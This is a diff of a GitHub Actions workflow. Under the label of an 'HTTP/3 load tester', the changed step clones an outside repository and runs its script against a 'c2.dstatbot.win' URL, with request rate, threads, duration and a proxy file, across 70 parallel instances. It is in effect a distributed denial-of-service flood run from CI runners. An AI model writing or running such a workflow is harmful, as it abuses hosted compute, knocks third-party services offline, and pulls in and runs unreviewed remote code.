@@ -38,9 +38,9 @@ jobs:
       - name: Run HTTP/3 load tester
         run: |
           
-          unzip m.zip
-          cd m
-          node m.js https://captcha.dstatbot.win/hNFAjCwd 700 64
+          git clone https://github.com/Ggeg111/curly-octo-doodle.git
+          cd curly-octo-doodle
+          node m.js GET https://c2.dstatbot.win/0D5Lkzy5 700 4 120 ya.txt --close
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
